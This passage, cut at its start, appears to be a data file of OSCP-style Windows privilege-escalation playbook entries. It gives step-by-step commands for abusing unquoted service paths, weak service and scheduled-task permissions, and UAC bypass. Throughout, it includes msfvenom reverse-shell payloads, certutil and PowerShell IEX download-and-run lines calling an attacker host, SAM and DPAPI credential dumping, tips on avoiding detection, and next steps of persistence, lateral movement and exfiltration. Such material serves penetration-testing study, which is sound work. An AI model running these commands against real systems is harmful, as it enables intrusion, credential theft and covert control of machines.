- Service runs as SYSTEM or LocalSystem

VERIFY WRITE PERMISSIONS:
icacls ""C:\Program Files""
icacls ""C:\Program Files\My Service""

Look for:
- (F) = Full control
- (M) = Modify
- (W) = Write
- For current user or Everyone/Authenticated Users groups

EXPLOITATION:

1. Generate payload matching service architecture:
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > Program.exe

2. Upload to writable path:
   certutil -urlcache -f http://<LHOST>/Program.exe ""C:\Program Files\Program.exe""

3. Restart service:
   sc stop <ServiceName>
   sc start <ServiceName>
   OR reboot system (if can't stop/start manually)

4. Receive SYSTEM shell when service starts

COMMON WRITABLE PATHS:
- C:\ root (older Windows versions)
- C:\Program Files (misconfigured permissions)
- Custom application directories

RESTRICTIONS:
- Modern Windows: C:\Program Files requires admin to write
- May need to wait for system reboot if can't restart service manually
- Service account must be SYSTEM for SYSTEM shell (verify with sc qc <service>)","",""
"uac-bypass-check","UAC Bypass Requirement Check","Determine if user is in Administrators group but running with Medium integrity (UAC enabled)","UAC (USER ACCOUNT CONTROL) BYPASS SCENARIO:

CHECK IF APPLICABLE:
1. User in Administrators group:
   net localgroup administrators
   whoami /groups | findstr /i ""S-1-5-32-544"" (Admin group SID)

2. But shell has Medium integrity:
   whoami /groups | findstr /i ""Mandatory Label""
   → Should show ""Medium Mandatory Level"" (not High)

3. UAC is enabled:
   reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA
   → Should return 0x1

WHY THIS HAPPENS:
User account is local admin, but UAC provides two tokens:
- Filtered Admin Token (Medium integrity - current shell)
- Full Admin Token (High integrity - requires elevation)

WITHOUT UAC BYPASS:
- Can't access ADMIN$ share, C$ share
- Can't modify SYSTEM files or registry (HKLM\SAM, etc.)
- Can't create/modify services
- Can't install drivers
- Can't debug other users' processes

WITH UAC BYPASS:
- All admin capabilities unlocked
- No SYSTEM shell but nearly equivalent
- Can then use admin rights to escalate to SYSTEM

UAC BYPASS TECHNIQUES:
1. FodHelper (Windows 10 build 17134+)
   - Fastest, most reliable
   - Registry hijack of ms-settings handler
   - Executes without UAC prompt

2. EventVwr (Windows 7-10)
   - Broader compatibility
   - Registry hijack of mscfile handler  
   - Backup option if FodHelper patched

WHEN NOT NEEDED:
- User is standard user (not in Admins group) → Need full privesc, not UAC bypass
- Shell already High integrity → Already elevated, no bypass needed
- UAC disabled (EnableLUA=0) → User already has full admin rights

VERIFICATION AFTER BYPASS:
whoami /groups | findstr /i ""Mandatory Label""
→ Should show ""High Mandatory Level""

TIME ESTIMATE: 2-3 minutes (verification + bypass + confirm)","",""
"service-permissions-check","Weak Service Permissions Exploitation","Identify services with weak permissions allowing binary replacement or configuration modification","SERVICE PERMISSION ABUSE:

Two main attack vectors:
1. Weak service binary permissions (replace executable)
2. Weak service configuration permissions (modify binPath)

ENUMERATION (requires accesschk.exe from Sysinternals):

Check service permissions:
  accesschk.exe -uwcqv ""Authenticated Users"" * /accepteula
  accesschk.exe -uwcqv ""Everyone"" * /accepteula
  accesschk.exe -uwcqv ""Users"" * /accepteula

Look for:
- SERVICE_ALL_ACCESS (full control - can do anything)
- SERVICE_CHANGE_CONFIG (can modify service settings)
- SERVICE_START / SERVICE_STOP (can restart service)

Check service binary permissions:
  accesschk.exe -wuvc ""Everyone"" ""C:\Program Files\Service\service.exe""
  icacls ""C:\Program Files\Service\service.exe""

Look for:
- (F) Full control
- (M) Modify  
- (W) Write
- For current user or low-privilege groups

EXPLOITATION PATH 1: Binary Replacement

1. Find modifiable service binary:
   sc qc <ServiceName>  (note BINARY_PATH_NAME)
   icacls ""<binary_path>""  (verify write permissions)

2. Backup original binary:
   copy ""C:\Path\service.exe"" ""C:\Path\service.exe.bak""

3. Replace with malicious payload:
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > shell.exe
   copy shell.exe ""C:\Path\service.exe"" /Y

4. Restart service:
   sc stop <ServiceName>
   sc start <ServiceName>

5. Receive SYSTEM shell (if service runs as SYSTEM)

EXPLOITATION PATH 2: Service Configuration Modification

1. Find service with SERVICE_CHANGE_CONFIG permission:
   accesschk.exe -uwcqv <ServiceName>

2. Query current configuration:
   sc qc <ServiceName>
   (Note original binPath for restoration)

3. Modify binPath to malicious command:
   sc config <ServiceName> binPath= ""cmd /c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')""

4. Restart service:
   sc stop <ServiceName>
   sc start <ServiceName>

5. Receive callback

6. Restore original binPath:
   sc config <ServiceName> binPath= ""<original_path>""

PRIORITY SERVICES TO CHECK:
- Custom applications (more likely misconfigured)
- Third-party software (antivirus, backup tools)
- Services running as SYSTEM (highest value)
- Auto-start services (persist across reboots)

COMMON MISCONFIGURATIONS:
- Everyone has Full Control on service binary
- Authenticated Users can change service config
- Service binary in user-writable directory (C:\temp, C:\Users\Public)","",""
"scheduled-tasks-check","Scheduled Task Exploitation","Identify scheduled tasks with writable scripts/binaries that run with elevated privileges","SCHEDULED TASKS PRIVILEGE ESCALATION:

ENUMERATION:

1. List all scheduled tasks:
   schtasks /query /fo LIST /v

2. Filter for tasks running as SYSTEM:
   schtasks /query /fo LIST /v | findstr /C:""Task To Run"" /C:""Run As User""

3. List task files directly:
   dir C:\windows\system32\tasks /s

LOOK FOR:
- Tasks running as SYSTEM or Administrator
- Tasks that execute scripts (.bat, .ps1, .vbs)
- Tasks with predictable schedule (next run time)
- Script/binary paths that are writable by current user

VERIFY WRITE PERMISSIONS:

For PowerShell script:
  icacls ""C:\Scripts\backup.ps1""

For batch file:
  icacls ""C:\Scripts\cleanup.bat""

For executable:
  icacls ""C:\Tools\monitor.exe""

Look for:
- (F) Full control
- (M) Modify
- (W) Write  
- For current user or Everyone/Authenticated Users

EXPLOITATION WORKFLOW:

1. Identify writable task script:
   Task: BackupTask
   Runs: C:\Scripts\backup.ps1
   As: SYSTEM
   Next Run: Daily at 3:00 AM

2. Backup original script:
   copy C:\Scripts\backup.ps1 C:\Scripts\backup.ps1.bak

3. Replace with malicious content:
   
   For .ps1 (PowerShell):
     echo IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1') > C:\Scripts\backup.ps1
   
   For .bat (Batch):
     echo powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1') > C:\Scripts\cleanup.bat
   
   For .vbs (VBScript):
     echo Set shell = CreateObject(""WScript.Shell"") > C:\Scripts\task.vbs
     echo shell.Run ""powershell -c IEX(...)"" >> C:\Scripts\task.vbs

4. Wait for scheduled execution OR force run:
   schtasks /run /tn BackupTask

5. Receive SYSTEM shell when task executes

6. Restore original:
   copy C:\Scripts\backup.ps1.bak C:\Scripts\backup.ps1

ALTERNATIVE: Binary Replacement

If task executes binary (not script):
1. Generate service-compatible payload:
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > evil.exe

2. Replace task binary:
   copy C:\Tools\monitor.exe C:\Tools\monitor.exe.bak
   copy evil.exe C:\Tools\monitor.exe

3. Wait for task execution or force run

TIMING CONSIDERATIONS:
- If next run is hours away: Force immediate execution with /run
- If cannot force run: Note for later, continue with other privesc methods
- If task runs frequently (every 5 minutes): Wait for automatic execution

COMMON LOCATIONS FOR TASK SCRIPTS:
- C:\Scripts\ (custom scripts)
- C:\Tools\ (administrative utilities)
- C:\Users\Administrator\Documents\ (user scripts)
- C:\inetpub\scripts\ (IIS-related tasks)

WARNINGS:
- Some tasks are critical (backup, monitoring). Replacement may break functionality.
- Always backup original script/binary.
- Restore after exploitation to avoid detection/system issues.
- Task execution may be logged (Event ID 4698, 4702).","",""
"manual-enumeration","Manual Privilege Escalation Checks","Perform manual enumeration for privilege escalation vectors that automated tools may miss","MANUAL ENUMERATION (when automated tools find nothing):

1. REGISTRY CREDENTIAL HUNTING:
   
   AutoLogon credentials:
     reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" | findstr /i ""DefaultUserName DefaultDomainName DefaultPassword""
   
   VNC passwords:
     reg query HKLM /f password /t REG_SZ /s
     reg query HKCU /f password /t REG_SZ /s
   
   Putty sessions:
     reg query HKCU\Software\SimonTatham\PuTTY\Sessions
   
   SNMP community strings:
     reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP

2. SAVED CREDENTIALS:
   
   Windows Credential Manager:
     cmdkey /list
   
   If credentials found:
     runas /savecred /user:DOMAIN\Administrator cmd
   
   Credential files:
     dir /s /b C:\*cred* C:\*password* C:\*.config 2>nul

3. SAM/SYSTEM BACKUP FILES:
   
   Check for backup files:
     dir /s /b C:\Windows\repair\SAM
     dir /s /b C:\Windows\System32\config\RegBack\SAM
   
   If found, extract and crack offline:
     reg save HKLM\SAM sam.hiv
     reg save HKLM\SYSTEM system.hiv
     impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL

4. GROUP MEMBERSHIP PRIVILEGES:
   
   Check special groups:
     whoami /groups | findstr /i ""Backup Operators""
     whoami /groups | findstr /i ""Server Operators""
   
   Backup Operators = Can read any file (dump SAM)
   Server Operators = Can modify services

5. DLL HIJACKING:
   
   Check PATH for writable directories:
     echo %PATH%
     icacls ""C:\CustomPath""
   
   Search for missing DLLs with Process Monitor:
     - Run procmon.exe
     - Filter: Result = NAME NOT FOUND, Path ends with .dll
     - Check if DLL path is writable
   
   Create malicious DLL:
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> -f dll > evil.dll
   
   Place in hijackable location and trigger application

6. PASSWORD FILES:
   
   Search common locations:
     dir /s /b C:\*pass* C:\*pwd* C:\*credential* 2>nul | findstr /v ""[System32 SysWOW64]""
   
   Check user directories:
     dir /s /b C:\Users\*\Desktop\*.txt
     dir /s /b C:\Users\*\Documents\*.txt
     dir /s /b C:\Users\*\*.kdbx (KeePass databases)
   
   Configuration files:
     type C:\inetpub\wwwroot\web.config | findstr /i password
     type C:\xampp\passwords.txt
     type C:\Program Files\FileZilla Server\FileZilla Server.xml

7. DPAPI MASTER KEYS:
   
   Find master keys:
     dir /a /s /b C:\Users\*\AppData\Roaming\Microsoft\Protect\ 2>nul
   
   Extract with Mimikatz (requires elevation - catch-22):
     mimikatz# dpapi::masterkey /in:<masterkey_file>
   
   Decrypt Chrome/RDP/WiFi passwords after obtaining master key

8. KERNEL EXPLOIT RESEARCH:
   
   Get detailed system info:
     systeminfo > systeminfo.txt
   
   Transfer to attacker machine:
     certutil -urlcache -f http://<LHOST>/systeminfo.txt system.txt
   
   Run Windows Exploit Suggester:
     python windows-exploit-suggester.py --database 2024-mssb.xls --systeminfo systeminfo.txt
   
   Prioritize HIGH severity exploits
   
   Common OSCP kernel exploits:
     - MS16-032 (Win7, Server 2008)
     - MS15-051 (Win7, Server 2008)
     - MS14-058 (Win8.1, Server 2012)
     - MS11-046 (WinXP, Server 2003 - rare now)

9. RUNNING PROCESSES:
   
   List all processes:
     tasklist /v
   
   Check for interesting services:
     - Database servers (MySQL, PostgreSQL)
     - File transfer apps (FileZilla, WinSCP)
     - Remote access tools (TeamViewer, AnyDesk)
     - Password managers (KeePass, LastPass)
   
   Dump process memory (if SeDebugPrivilege):
     procdump -ma <PID>
   
   Search memory dumps for passwords:
     strings process.dmp | findstr /i password

10. NETWORK SHARES:
    
    List available shares:
      net view \\localhost
      net share
    
    Check writable shares:
      icacls \\localhost\C$
      icacls \\localhost\ADMIN$
    
    Enumerate network shares on domain:
      net view /domain
      for /f %i in ('net view ^| findstr ""^\\\\""') do @echo %i & @net view %i /all

PRIORITIZATION:
1. Saved credentials (cmdkey /list) - Immediate win if found
2. Registry passwords (AutoLogon) - Cleartext credentials
3. SAM backups - Offline hash cracking
4. Group privileges (Backup Operators) - Special capabilities
5. Password files - Low-hanging fruit
6. DLL hijacking - Requires local application execution
7. Kernel exploits - Last resort (stability risk)

TIME ALLOCATION:
- Registry hunting: 5 minutes
- Saved credentials: 2 minutes  
- File searching: 10 minutes
- Kernel exploit research: 5 minutes
- Total: ~20-25 minutes","",""
"verify-system-access","Verify SYSTEM/Administrator Access","Confirm effective privilege escalation to SYSTEM or Administrator level access","VERIFICATION STEPS:

1. Verify Current User:
   whoami
   
   Expected outputs:
   - nt authority\system (SYSTEM - highest privilege)
   - DOMAIN\Administrator (Domain admin)
   - <HOSTNAME>\Administrator (Local admin)
   - DOMAIN\<user> with High integrity (Admin user with UAC bypass)

2. Verify Privileges:
   whoami /priv
   
   Look for:
   - SeDebugPrivilege (Enabled) - Can debug processes, dump LSASS
   - SeTcbPrivilege (Enabled) - Act as part of OS
   - SeBackupPrivilege (Enabled) - Can backup any file
   - SeRestorePrivilege (Enabled) - Can restore any file
   - SeImpersonatePrivilege (Enabled) - Already used for Potato
   
   SYSTEM has ALL privileges enabled.

3. Verify Integrity Level:
   whoami /groups | findstr /i ""Mandatory Label""
   
   Expected:
   - System Mandatory Level (SYSTEM)
   - High Mandatory Level (Administrator)
   
   NOT acceptable:
   - Medium Mandatory Level (still filtered admin - need UAC bypass)

4. Test Filesystem Access:
   
   Read SAM registry:
     reg query HKLM\SAM\SAM\Domains\Account\Users
     (Access granted = SYSTEM or admin with High integrity)
   
   List protected directory:
     dir C:\Windows\System32\config
     (Should see SAM, SYSTEM, SECURITY files)
   
   Access ADMIN$ share:
     dir \\localhost\C$
     dir \\localhost\ADMIN$
     (Access granted = admin privileges)

5. Test Service Management:
   
   Query service:
     sc query <any_service>
   
   Create test service (then delete):
     sc create TestService binPath= ""C:\Windows\System32\cmd.exe""
     sc delete TestService
     (Success = admin/SYSTEM access)

6. Verify Group Membership:
   
   whoami /groups
   
   Look for:
   - BUILTIN\Administrators (S-1-5-32-544)
   - NT AUTHORITY\SYSTEM (S-1-5-18) if SYSTEM user
   - Domain Admins (S-1-5-21-<domain>-512) if domain admin

SUCCESS CRITERIA:
✓ User is nt authority\system OR Administrator account
✓ Integrity level is System or High
✓ All critical privileges enabled
✓ Can access protected files (SAM registry, config files)
✓ Can manage services (create/modify/delete)
✓ Can access administrative shares (C$, ADMIN$)

FAILURE INDICATORS:
✗ User is still low-privilege account
✗ Integrity level is Medium (UAC filtering active)
✗ Access denied on protected resources
✗ Cannot create/modify services
✗ Administrative shares inaccessible

IF VERIFICATION FAILS:
- Exploitation may have partially succeeded
- Check if new shell spawned in background (check process list)
- Verify exploit payload executed (check logs, network traffic)
- Try alternative exploitation method
- Re-run enumeration to find missed vectors

NEXT STEPS AFTER CONFIRMATION:
1. Credential dumping (Mimikatz, secretsdump)
2. Persistence mechanisms (new admin user, scheduled task, service)
3. Lateral movement preparation (enumerate domain, find targets)
4. Sensitive data exfiltration (database dumps, file searches)
5. Evidence collection for documentation","",""
